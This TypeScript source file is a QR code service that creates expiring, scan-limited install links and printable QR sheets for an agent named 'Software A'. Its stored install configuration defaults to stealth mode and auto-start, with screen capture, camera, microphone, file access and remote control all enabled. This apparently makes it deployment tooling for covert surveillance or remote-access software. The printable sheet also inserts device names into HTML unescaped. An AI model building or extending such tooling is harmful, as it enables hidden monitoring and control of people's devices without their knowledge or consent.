/**
 * QR Code Service - Military-Grade Edition
 * Generates and manages QR codes for Software A installation
 * Admin-controlled expiry from 24 hours to 7 days
 */

import QRCode from 'qrcode';
import crypto from 'crypto';
import { db } from '../config/database';
import { Logger } from '../utils/Logger';

export interface QRCodeConfig {
  organizationId: string;
  adminEmail: string;
  deviceName?: string;
  groupId?: string;
  expiryHours: number; // 24-168 (1-7 days)
  maxScans?: number;
  autoStart?: boolean;
  stealthMode?: boolean;
  permissions?: {
    screenCapture?: boolean;
    camera?: boolean;
    microphone?: boolean;
    fileAccess?: boolean;
    remoteControl?: boolean;
  };
}

export interface QRCodeData {
  id: string;
  token: string;
  installUrl: string;
  qrCodeDataUrl: string;
  qrCodePngUrl: string;
  qrCodeSvgUrl: string;
  organizationId: string;
  adminEmail: string;
  deviceName?: string;
  groupId?: string;
  createdAt: Date;
  expiresAt: Date;
  expiryHours: number;
  maxScans: number;
  scannedCount: number;
  status: 'active' | 'expired' | 'exhausted' | 'revoked';
  lastScannedAt?: Date;
}

export class QRCodeService {
  private logger: Logger;
  private baseUrl: string;

  constructor() {
    this.logger = new Logger('QRCodeService');
    this.baseUrl = process.env.INSTALL_BASE_URL || 'https://install.bixtx.com';
  }

  /**
   * Generate QR code for installation
   */
  async generateQRCode(config: QRCodeConfig): Promise<QRCodeData> {
    try {
      this.logger.info('Generating QR code for installation...');

      // Validate expiry hours (24-168 hours = 1-7 days)
      if (config.expiryHours < 24 || config.expiryHours > 168) {
        throw new Error('Expiry hours must be between 24 and 168 (1-7 days)');
      }

      // Generate unique token
      const token = this.generateSecureToken();
      
      // Calculate expiration
      const expiresAt = new Date();
      expiresAt.setHours(expiresAt.getHours() + config.expiryHours);

      // Generate installation URL
      const installUrl = `${this.baseUrl}/?token=${token}&server=${process.env.API_URL}`;

      // Generate QR codes in different formats
      const qrCodeDataUrl = await this.generateQRCodeDataURL(installUrl);
      const qrCodePngUrl = await this.saveQRCodePNG(token, installUrl);
      const qrCodeSvgUrl = await this.saveQRCodeSVG(token, installUrl);

      // Create QR code record
      const qrCodeData: QRCodeData = {
        id: crypto.randomUUID(),
        token,
        installUrl,
        qrCodeDataUrl,
        qrCodePngUrl,
        qrCodeSvgUrl,
        organizationId: config.organizationId,
        adminEmail: config.adminEmail,
        deviceName: config.deviceName,
        groupId: config.groupId,
        createdAt: new Date(),
        expiresAt,
        expiryHours: config.expiryHours,
        maxScans: config.maxScans || 1,
        scannedCount: 0,
        status: 'active',
      };

      // Save to database
      await db.qrCodes.create(qrCodeData);

      // Store installation configuration
      await db.installConfigs.create({
        token,
        config: {
          organizationId: config.organizationId,
          deviceName: config.deviceName,
          groupId: config.groupId,
          adminEmail: config.adminEmail,
          autoStart: config.autoStart !== false,
          stealthMode: config.stealthMode !== false,
          permissions: config.permissions || {
            screenCapture: true,
            camera: true,
            microphone: true,
            fileAccess: true,
            remoteControl: true,
          },
        },
      });

      this.logger.info(`QR code generated successfully: ${qrCodeData.id}`);
      return qrCodeData;
    } catch (error) {
      this.logger.error('Failed to generate QR code:', error);
      throw error;
    }
  }

  /**
   * Generate multiple QR codes (bulk)
   */
  async generateBulkQRCodes(
    config: QRCodeConfig,
    count: number
  ): Promise<QRCodeData[]> {
    const qrCodes: QRCodeData[] = [];

    for (let i = 0; i < count; i++) {
      const qrCode = await this.generateQRCode({
        ...config,
        deviceName: config.deviceName ? `${config.deviceName}-${i + 1}` : undefined,
      });
      qrCodes.push(qrCode);
    }

    return qrCodes;
  }

  /**
   * Generate QR code as Data URL (base64)
   */
  private async generateQRCodeDataURL(url: string): Promise<string> {
    try {
      const options = {
        errorCorrectionLevel: 'H',
        type: 'image/png' as const,
        quality: 1,
        margin: 2,
        width: 512,
        color: {
          dark: '#000000',
          light: '#FFFFFF',
        },
      };

      const dataUrl = await QRCode.toDataURL(url, options);
      return dataUrl;
    } catch (error) {
      this.logger.error('Failed to generate QR code data URL:', error);
      throw error;
    }
  }

  /**
   * Generate and save QR code as PNG
   */
  private async saveQRCodePNG(token: string, url: string): Promise<string> {
    try {
      const options = {
        errorCorrectionLevel: 'H',
        type: 'image/png' as const,
        quality: 1,
        margin: 2,
        width: 512,
        color: {
          dark: '#000000',
          light: '#FFFFFF',
        },
      };

      // In production, save to cloud storage (S3, etc.)
      const filename = `qr-${token}.png`;
      const publicUrl = `${process.env.CDN_URL}/qr-codes/${filename}`;

      // Generate buffer
      const buffer = await QRCode.toBuffer(url, options);
      
      // Save to storage (implementation depends on cloud provider)
      // await cloudStorage.upload(buffer, filename);

      return publicUrl;
    } catch (error) {
      this.logger.error('Failed to save QR code PNG:', error);
      throw error;
    }
  }

  /**
   * Generate and save QR code as SVG
   */
  private async saveQRCodeSVG(token: string, url: string): Promise<string> {
    try {
      const options = {
        errorCorrectionLevel: 'H',
        type: 'svg' as const,
        margin: 2,
        width: 512,
        color: {
          dark: '#000000',
          light: '#FFFFFF',
        },
      };

      // In production, save to cloud storage
      const filename = `qr-${token}.svg`;
      const publicUrl = `${process.env.CDN_URL}/qr-codes/${filename}`;

      // Generate SVG string
      const svgString = await QRCode.toString(url, options);
      
      // Save to storage
      // await cloudStorage.upload(svgString, filename);

      return publicUrl;
    } catch (error) {
      this.logger.error('Failed to save QR code SVG:', error);
      throw error;
    }
  }

  /**
   * Track QR code scan
   */
  async trackScan(token: string): Promise<void> {
    try {
      const qrCode = await db.qrCodes.findOne({ token });

      if (!qrCode) {
        throw new Error('QR code not found');
      }

      // Check status
      if (qrCode.status !== 'active') {
        throw new Error(`QR code is ${qrCode.status}`);
      }

      // Check expiration
      if (new Date() > qrCode.expiresAt) {
        await db.qrCodes.update(qrCode.id, { status: 'expired' });
        throw new Error('QR code has expired');
      }

      // Check scan limit
      if (qrCode.scannedCount >= qrCode.maxScans) {
        await db.qrCodes.update(qrCode.id, { status: 'exhausted' });
        throw new Error('QR code scan limit reached');
      }

      // Update scan count
      await db.qrCodes.update(qrCode.id, {
        scannedCount: qrCode.scannedCount + 1,
        lastScannedAt: new Date(),
      });

      // Check if exhausted now
      if (qrCode.scannedCount + 1 >= qrCode.maxScans) {
        await db.qrCodes.update(qrCode.id, { status: 'exhausted' });
      }

      this.logger.info(`QR code scanned: ${token}`);
    } catch (error) {
      this.logger.error('Failed to track scan:', error);
      throw error;
    }
  }

  /**
   * Get QR code by ID
   */
  async getQRCode(id: string): Promise<QRCodeData | null> {
    try {
      return await db.qrCodes.findOne({ id });
    } catch (error) {
      this.logger.error('Failed to get QR code:', error);
      throw error;
    }
  }

  /**
   * Get QR code by token
   */
  async getQRCodeByToken(token: string): Promise<QRCodeData | null> {
    try {
      return await db.qrCodes.findOne({ token });
    } catch (error) {
      this.logger.error('Failed to get QR code by token:', error);
      throw error;
    }
  }

  /**
   * Get all QR codes for organization
   */
  async getQRCodesByOrganization(organizationId: string): Promise<QRCodeData[]> {
    try {
      return await db.qrCodes.findMany({ organizationId });
    } catch (error) {
      this.logger.error('Failed to get QR codes:', error);
      throw error;
    }
  }

  /**
   * Update QR code status
   */
  async updateStatus(id: string, status: QRCodeData['status']): Promise<void> {
    try {
      await db.qrCodes.update(id, { status });
      this.logger.info(`QR code status updated: ${id} -> ${status}`);
    } catch (error) {
      this.logger.error('Failed to update QR code status:', error);
      throw error;
    }
  }

  /**
   * Revoke QR code
   */
  async revokeQRCode(id: string): Promise<void> {
    try {
      await this.updateStatus(id, 'revoked');
      this.logger.info(`QR code revoked: ${id}`);
    } catch (error) {
      this.logger.error('Failed to revoke QR code:', error);
      throw error;
    }
  }

  /**
   * Check and update expired QR codes
   */
  async checkExpiredQRCodes(): Promise<void> {
    try {
      const activeQRCodes = await db.qrCodes.findMany({ status: 'active' });
      const now = new Date();

      for (const qrCode of activeQRCodes) {
        if (now > qrCode.expiresAt) {
          await this.updateStatus(qrCode.id, 'expired');
          this.logger.info(`QR code expired: ${qrCode.id}`);
        }
      }
    } catch (error) {
      this.logger.error('Failed to check expired QR codes:', error);
    }
  }

  /**
   * Get QR code statistics
   */
  async getStatistics(organizationId: string): Promise<any> {
    try {
      const qrCodes = await this.getQRCodesByOrganization(organizationId);

      // Calculate time until expiry for active codes
      const now = new Date();
      const activeWithExpiry = qrCodes
        .filter(qr => qr.status === 'active')
        .map(qr => ({
          ...qr,
          hoursUntilExpiry: Math.max(0, Math.floor((qr.expiresAt.getTime() - now.getTime()) / (1000 * 60 * 60))),
        }));

      return {
        total: qrCodes.length,
        active: qrCodes.filter(qr => qr.status === 'active').length,
        expired: qrCodes.filter(qr => qr.status === 'expired').length,
        exhausted: qrCodes.filter(qr => qr.status === 'exhausted').length,
        revoked: qrCodes.filter(qr => qr.status === 'revoked').length,
        totalScans: qrCodes.reduce((sum, qr) => sum + qr.scannedCount, 0),
        expiryBreakdown: {
          within24Hours: activeWithExpiry.filter(qr => qr.hoursUntilExpiry <= 24).length,
          within48Hours: activeWithExpiry.filter(qr => qr.hoursUntilExpiry <= 48 && qr.hoursUntilExpiry > 24).length,
          within7Days: activeWithExpiry.filter(qr => qr.hoursUntilExpiry > 48).length,
        },
      };
    } catch (error) {
      this.logger.error('Failed to get QR code statistics:', error);
      throw error;
    }
  }

  /**
   * Generate custom branded QR code
   */
  async generateBrandedQRCode(config: QRCodeConfig, logo?: string): Promise<string> {
    try {
      const token = this.generateSecureToken();
      const installUrl = `${this.baseUrl}/?token=${token}&server=${process.env.API_URL}`;

      const options = {
        errorCorrectionLevel: 'H',
        type: 'image/png' as const,
        quality: 1,
        margin: 2,
        width: 512,
        color: {
          dark: '#667eea', // Brand color
          light: '#FFFFFF',
        },
      };

      const dataUrl = await QRCode.toDataURL(installUrl, options);

      // If logo provided, overlay it on the QR code
      if (logo) {
        // Implementation for logo overlay would go here
        // Using canvas to composite logo on QR code
      }

      return dataUrl;
    } catch (error) {
      this.logger.error('Failed to generate branded QR code:', error);
      throw error;
    }
  }

  /**
   * Generate printable QR code sheet
   */
  async generatePrintableSheet(qrCodes: QRCodeData[]): Promise<string> {
    try {
      // Generate HTML for printable sheet with multiple QR codes
      const html = `
<!DOCTYPE html>
<html>
<head>
    <style>
        @page { size: A4; margin: 1cm; }
        body { font-family: Arial, sans-serif; }
        .qr-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
        .qr-item { text-align: center; page-break-inside: avoid; padding: 10px; border: 1px solid #ddd; }
        .qr-item img { width: 100%; max-width: 200px; }
        .qr-info { font-size: 12px; margin-top: 10px; }
        .qr-expires { color: red; font-weight: bold; }
        @media print { .no-print { display: none; } }
    </style>
</head>
<body>
    <h1>bixtx.com Link Installation QR Codes</h1>
    <div class="qr-grid">
        ${qrCodes.map(qr => `
            <div class="qr-item">
                <img src="${qr.qrCodeDataUrl}" alt="QR Code">
                <div class="qr-info">
                    ${qr.deviceName ? `<div><strong>${qr.deviceName}</strong></div>` : ''}
                    <div>Expires: ${qr.expiresAt.toLocaleDateString()}</div>
                    <div>Max Scans: ${qr.maxScans}</div>
                </div>
            </div>
        `).join('')}
    </div>
    <div class="no-print" style="margin-top: 20px;">
        <button onclick="window.print()">Print This Page</button>
    </div>
</body>
</html>
      `;

      return html;
    } catch (error) {
      this.logger.error('Failed to generate printable sheet:', error);
      throw error;
    }
  }

  /**
   * Generate secure token
   */
  private generateSecureToken(): string {
    return crypto.randomBytes(32).toString('hex');
  }
}
